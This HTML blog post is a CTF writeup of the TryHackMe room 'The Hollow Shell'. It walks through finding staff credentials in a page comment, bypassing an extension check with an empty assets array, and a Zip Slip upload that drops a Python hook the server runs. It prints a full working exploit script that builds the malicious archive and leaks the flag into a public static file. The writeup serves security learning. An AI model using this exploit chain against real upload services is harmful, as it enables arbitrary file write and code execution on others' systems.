@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Hacker Holidays 2026 — The Hollow Shell Writeup — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="Walkthrough of The Hollow Shell room demonstrating source code credential disclosure, upload functionality analysis, Zip Slip exploitation, extension validation bypass, automated hook execution, and flag retrieval.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-the-hollow-shell-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Hacker Holidays 2026 — The Hollow Shell Writeup">
+  <meta property="og:description" content="Walkthrough of The Hollow Shell room demonstrating source code credential disclosure, upload functionality analysis, Zip Slip exploitation, extension validation bypass, automated hook execution, and flag retrieval.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-the-hollow-shell-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-07-08T00:00:00.000Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="attack-techniques">
+  <meta property="article:tag" content="pentesting">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Hacker Holidays 2026 — The Hollow Shell Writeup">
+  <meta name="twitter:description" content="Walkthrough of The Hollow Shell room demonstrating source code credential disclosure, upload functionality analysis, Zip Slip exploitation, extension validation bypass, automated hook execution, and flag retrieval.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Hacker Holidays 2026 — The Hollow Shell Writeup","description":"Walkthrough of The Hollow Shell room demonstrating source code credential disclosure, upload functionality analysis, Zip Slip exploitation, extension validation bypass, automated hook execution, and flag retrieval.","datePublished":"2026-07-08T00:00:00.000Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-the-hollow-shell-writeup/","keywords":"ctf, web-security, attack-techniques, pentesting"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-tryhackme-the-hollow-shell-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Hacker Holidays 2026 — The Hollow Shell Writeup</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 07-08-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">attack-techniques</span><span class="card-cat-chip">pentesting</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<p><strong>Room:</strong> The Hollow Shell<br><strong>Category:</strong> Web<br><strong>Difficulty:</strong> Medium<br><strong>Room URL:</strong> <a href="https://tryhackme.com/room/hh-thehollowshell-ddb582ac">https://tryhackme.com/room/hh-thehollowshell-ddb582ac</a></p>
+<h2>Scenario</h2>
+<p>The Byte Lotus Hotel allows staff to upload &quot;shells&quot; — ZIP packages containing media and configuration used to customize in-room displays. The upload portal appears to validate uploaded content, but hidden functionality and unsafe archive extraction provide an opportunity to execute arbitrary code and retrieve the room flag.</p>
+<hr>
+<h1>Enumeration</h1>
+<p>The room description points to:</p>
+<pre><code class="language-text">http://10.49.142.249
+</code></pre>
+<p>Initially, nothing is available on the default HTTP port, so the first step is performing a service scan.</p>
+<pre><code class="language-bash">nmap -sV -T4 10.49.142.249
+</code></pre>
+<img width="647" height="497" alt="Screenshot 2026-08-07 114642" src="https://github.com/user-attachments/assets/22ead528-fdf7-44c9-a2b4-70f9ef34fc1c" />
+
+
+<p>The scan reveals that the web application is actually running on <strong>port 5000</strong>.</p>
+<p>Visiting:</p>
+<pre><code class="language-text">http://10.49.142.249:5000
+</code></pre>
+<p>shows a login page.</p>
+<img width="1274" height="762" alt="Screenshot 2026-08-07 114737" src="https://github.com/user-attachments/assets/aa77f96a-70f4-417c-b14f-8bc88216f454" />
+
+
+<hr>
+<h1>Finding Credentials</h1>
+<p>Viewing the page source reveals an HTML comment accidentally containing the default staff credentials.</p>
+<pre><code class="language-html">&lt;!--
+Byte Lotus // internal display-manager portal
+
+user: concierge
+pass: StayNoticed2024!
+--&gt;
+</code></pre>
+<img width="725" height="459" alt="Screenshot 2026-08-07 114822" src="https://github.com/user-attachments/assets/b9e70eea-8dd5-46ae-9804-c7513f995c37" />
+
+
+<p>Using those credentials grants access to the administration dashboard.</p>
+<img width="1227" height="729" alt="Screenshot 2026-08-07 114918" src="https://github.com/user-attachments/assets/06dc275e-2509-41d1-9f42-fd17bf700ed1" />
+
+<hr>
+<h1>Understanding the Upload Functionality</h1>
+<p>Inside the dashboard is a feature allowing users to upload ZIP files called <strong>Shells</strong>.</p>
+<p>The page explains that every upload must contain a manifest file named:</p>
+<pre><code class="language-text">shell.json
+</code></pre>
+<p>It also mentions that uploaded packages may include optional <strong>automation hooks</strong> that are automatically processed by a background worker.</p>
+<p>The interface states that only the following asset types are allowed:</p>
+<pre><code class="language-text">png
+jpg
+gif
+svg
+css
+json
+</code></pre>
+<p>This immediately suggests inspecting how uploaded archives are validated and extracted.</p>
+<hr>
+<h1>Observing Application Behavior</h1>
+<p>Testing the upload functionality reveals several important behaviors.</p>
+<p>The application:</p>
+<ul>
+<li>accepts ZIP archives</li>
+<li>requires a <code>shell.json</code> manifest</li>
+<li>validates file extensions using the <code>assets</code> field inside the manifest</li>
+<li>extracts uploaded archives into</li>
+</ul>
+<pre><code class="language-text">shells/&lt;random-id&gt;/
+</code></pre>
+<p>For example:</p>
+<pre><code class="language-text">Shell &#39;exploit&#39; brought ashore.
+Stored at shells/804bbf170378/
+</code></pre>
+<p>Uploaded files become directly accessible through URLs such as:</p>
+<pre><code class="language-text">/shells/&lt;uuid&gt;/shell.json
+</code></pre>
+<p>The application also serves static content from:</p>
+<pre><code class="language-text">/static/
+</code></pre>
+<p>Invalid asset extensions generate messages like:</p>
+<pre><code class="language-text">Shell rejected: asset type not allowed
+</code></pre>
+<p>while unexpected failures return a generic Flask Internal Server Error.</p>
+<p>One particularly interesting note is that uploaded shells may contain <strong>automation hooks</strong>, which are executed shortly after upload.</p>
+<hr>
+<h1>Zip Slip</h1>
+<p>The application extracts user-controlled ZIP archives, making <strong>Zip Slip</strong> a potential attack vector.</p>
+<p>Zip Slip is a directory traversal vulnerability that occurs when archive extraction trusts filenames supplied inside an archive.</p>
+<p>Instead of extracting:</p>
+<pre><code class="language-text">image.png
+</code></pre>
+<p>an attacker can include entries such as:</p>
+<pre><code class="language-text">../../hooks/get_flag.py
+</code></pre>
+<p>If the extraction process does not sanitize paths, files are written outside the intended directory.</p>
+<p>This can lead to:</p>
+<ul>
+<li>arbitrary file overwrite</li>
+<li>configuration replacement</li>
+<li>remote code execution</li>
+<li>persistence</li>
+<li>privilege escalation</li>
+</ul>
+<hr>
+<h1>Exploit Strategy</h1>
+<p>After several attempts, the working exploit chain consists of three independent issues.</p>
+<h2>1. Extension Validation Bypass</h2>
+<p>The application only validates filenames listed inside:</p>
+<pre><code class="language-json">assets
+</code></pre>
+<p>within <code>shell.json</code>.</p>
+<p>Using an empty array completely bypasses extension validation.</p>
+<pre><code class="language-json">{
+    &quot;name&quot;: &quot;exploit&quot;,
+    &quot;assets&quot;: []
+}
+</code></pre>
+<hr>
+<h2>2. Zip Slip Arbitrary File Write</h2>
+<p>The archive contains a malicious entry:</p>
+<pre><code class="language-text">../../hooks/get_flag.py
+</code></pre>
+<p>During extraction:</p>
+<pre><code class="language-text">shells/&lt;uuid&gt;/../../hooks/get_flag.py
+</code></pre>
+<p>resolves to</p>
+<pre><code class="language-text">hooks/get_flag.py
+</code></pre>
+<p>allowing an attacker-controlled Python file to be written into the application&#39;s hooks directory.</p>
+<hr>
+<h2>3. Automatic Hook Execution</h2>
+<p>According to the application, uploaded shells may contain automation hooks processed by a background worker.</p>
+<p>Once the malicious Python file is written into:</p>
+<pre><code class="language-text">hooks/
+</code></pre>
+<p>the worker automatically executes it.</p>
+<p>The payload:</p>
+<ul>
+<li>searches common flag locations</li>
+<li>reads the flag</li>
+<li>writes the result into</li>
+</ul>
+<pre><code class="language-text">static/leaked_flag.css
+</code></pre>
+<p>Since the static directory is publicly accessible, the flag can be retrieved over HTTP without requiring an interactive shell.</p>
+<hr>
+<h1>Final Exploit Script</h1>
+<p>Save the following script as:</p>
+<pre><code class="language-text">hollow_shell_exploit.py
+</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;
+The Hollow Shell - Final Exploit
+Made by aryan giri | giriaryan694-a11y
+
+Bypasses extension check via empty assets array.
+Drops flag retrieval payload into the automated hooks directory.
+The theme worker executes the dropped script, reads the flag,
+and writes it to the web-accessible static directory.
+&quot;&quot;&quot;
+
+import zipfile
+import json
+
+__author__ = &quot;aryan giri | giriaryan694-a11y&quot;
+
+OUT = &quot;hollow_shell_final.zip&quot;
+
+# 1. EMPTY assets array completely bypasses the extension filter.
+manifest = {
+    &quot;name&quot;: &quot;exploit&quot;,
+    &quot;assets&quot;: []
+}
+
+# 2. Python script executed by the theme worker.
+# It searches common flag locations and writes the flag into /static/.
+hook_script = &quot;&quot;&quot;
+import os
+import glob
+
+flag_content = &quot;FLAG_NOT_FOUND_TRY_LATER&quot;
+
+# Common CTF flag locations
+patterns = [
+    &quot;/flag*&quot;,
+    &quot;/flag.txt&quot;,
+    &quot;/app/flag*&quot;,
+    &quot;/app/flag.txt&quot;,
+    &quot;/home/*/flag*&quot;,
+    &quot;/home/*/flag.txt&quot;,
+    &quot;/home/roomservice/flag*&quot;,
+    &quot;/home/roomservice/flag.txt&quot;,
+    &quot;/root/flag*&quot;,
+    &quot;/root/flag.txt&quot;,
+    &quot;/opt/flag*&quot;
+]
+
+for p in patterns:
+    for f in glob.glob(p):
+        try:
+            with open(f, &quot;r&quot;) as file:
+                flag_content = file.read().strip()
+                break
+        except:
+            pass
+
+output = &quot;/* FLAG: &quot; + flag_content + &quot; */\\n&quot;
+
+# Try multiple possible static paths because worker CWD may vary
+paths_to_try = []
+
+try:
+    current_file = os.path.abspath(__file__)
+    hooks_dir = os.path.dirname(current_file)
+    app_root = os.path.dirname(hooks_dir)
+
+    paths_to_try.append(os.path.join(app_root, &quot;static&quot;, &quot;leaked_flag.css&quot;))
+    paths_to_try.append(os.path.join(hooks_dir, &quot;..&quot;, &quot;static&quot;, &quot;leaked_flag.css&quot;))
+except:
+    pass
+
+paths_to_try += [
+    &quot;../../static/leaked_flag.css&quot;,
+    &quot;../static/leaked_flag.css&quot;,
+    &quot;static/leaked_flag.css&quot;,
+    &quot;/app/static/leaked_flag.css&quot;,
+    &quot;/var/www/html/static/leaked_flag.css&quot;
+]
+
+for path in paths_to_try:
+    try:
+        with open(path, &quot;w&quot;) as f:
+            f.write(output)
+    except:
+        pass
+&quot;&quot;&quot;
+
+with zipfile.ZipFile(OUT, &quot;w&quot;) as zf:
+    # Required manifest
+    zf.writestr(&quot;shell.json&quot;, json.dumps(manifest))
+
+    # Zip Slip payload:
+    # shells/&lt;uuid&gt;/../../hooks/get_flag.py -&gt; hooks/get_flag.py
+    zf.writestr(&quot;../../hooks/get_flag.py&quot;, hook_script)
+
+    # Sanity check file to prove Zip Slip worked
+    zf.writestr(&quot;../../static/sanity_check.css&quot;, &quot;/* EXTRACTION_SUCCESS */\n&quot;)
+
+print(&quot;[+] Generated:&quot;, OUT)
+print(&quot;[+] Made by aryan giri | giriaryan694-a11y&quot;)
+print(&quot;[+] Upload this ZIP to the Shoreline Display portal.&quot;)
+print(&quot;[+] Then check:&quot;)
+print(&quot;    http://TARGET:5000/static/sanity_check.css&quot;)
+print(&quot;    http://TARGET:5000/static/leaked_flag.css&quot;)
+</code></pre>
+<hr>
+<h1>Generate the Malicious Archive</h1>
+<pre><code class="language-bash">python3 hollow_shell_exploit.py
+</code></pre>
+<p>The script generates:</p>
+<pre><code class="language-text">hollow_shell_final.zip
+</code></pre>
+<p>Verify its contents:</p>
+<pre><code class="language-bash">python3 -m zipfile -l hollow_shell_final.zip
+</code></pre>
+<p>Expected entries:</p>
+<pre><code class="language-text">shell.json
+../../hooks/get_flag.py
+../../static/sanity_check.css
+</code></pre>
+<hr>
+<h1>Upload the Shell</h1>
+<p>Upload the generated archive through the Shoreline Display portal.</p>
+<img width="962" height="467" alt="Screenshot 2026-08-07 134620" src="https://github.com/user-attachments/assets/9c7a035e-238f-4d85-a57c-da1ba9ebc9a6" />
+
+
+<p>After uploading, the application reports:</p>
+<pre><code class="language-text">Shell &#39;exploit&#39; brought ashore.
+Stored at shells/804bbf170378/
+and held to the room&#39;s ear.
+</code></pre>
+<img width="916" height="606" alt="Screenshot 2026-08-07 134636" src="https://github.com/user-attachments/assets/f2b8c430-a689-4072-8107-7f5851f52cd5" />
+
+
+<p>This confirms the archive has been extracted and processed.</p>
+<hr>
+<h1>Verify Arbitrary File Write</h1>
+<p>Confirm that Zip Slip successfully wrote a file into the application&#39;s static directory.</p>
+<pre><code class="language-bash">curl http://TARGET:5000/static/sanity_check.css
+</code></pre>
+<p>Expected response:</p>
+<pre><code class="language-css">/* EXTRACTION_SUCCESS */
+</code></pre>
+<p>This verifies arbitrary file write.</p>
+<hr>
+<h1>Retrieve the Flag</h1>
+<p>Wait a few seconds for the theme worker to execute the hook.</p>
+<p>Then browse to:</p>
+<pre><code class="language-text">http://TARGET:5000/static/leaked_flag.css
+</code></pre>
+<p>or</p>
+<pre><code class="language-bash">curl http://TARGET:5000/static/leaked_flag.css
+</code></pre>
+<img width="726" height="223" alt="Screenshot 2026-08-07 135056" src="https://github.com/user-attachments/assets/566858e0-3428-4e50-9afc-c06d4337cbab" />
+
+
+<p>The response contains the TryHackMe flag inside a CSS comment.</p>
+<p>The flag has been intentionally hidden in this writeup to comply with TryHackMe&#39;s content guidelines.</p>
+<hr>
+<h1>Attack Chain</h1>
+<pre><code class="language-text">Source Code Review
+        │
+        ▼
+Hardcoded Credentials
+        │
+        ▼
+Authenticated Dashboard
+        │
+        ▼
+Upload Shell ZIP
+        │
+        ▼
+Empty assets[] bypasses extension validation
+        │
+        ▼
+Zip Slip directory traversal
+        │
+        ▼
+Overwrite hooks/get_flag.py
+        │
+        ▼
+Theme Worker Executes Hook
+        │
+        ▼
+Flag Written to /static/leaked_flag.css
+        │
+        ▼
+Retrieve Flag via HTTP
+</code></pre>
+<h2>Key Takeaways</h2>
+<ul>
+<li>Never rely solely on client-controlled metadata for security decisions.</li>
+<li>Archive extraction routines must sanitize filenames to prevent directory traversal.</li>
+<li>Background automation that executes uploaded content significantly increases the impact of arbitrary file write vulnerabilities.</li>
+<li>Information disclosure, weak validation, and unsafe extraction combined into a complete remote code execution chain.</li>
+</ul>
+<p>Happy Hacking!</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
